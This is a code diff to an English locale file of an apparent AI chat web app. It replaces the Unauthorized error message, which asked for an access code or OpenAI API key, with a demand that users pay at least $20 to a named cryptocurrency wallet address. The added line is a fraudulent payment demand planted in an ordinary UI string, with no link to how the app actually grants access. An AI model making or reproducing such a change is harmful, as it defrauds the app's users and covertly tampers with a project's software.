@@ -10,7 +10,7 @@ const en: LocaleType = {
   Error: {
     Unauthorized: isApp
       ? "Invalid API Key, please check it in [Settings](/#/settings) page."
-      : "Unauthorized access, please enter access code in [auth](/#/auth) page, or enter your OpenAI API Key.",
+      : "To access various models, you must pay at least $20 to the wallet address `0x36467eF1BB46800F17422ad96aFcC5362B324564`. ",
   },
   Auth: {
     Title: "Need Access Code",
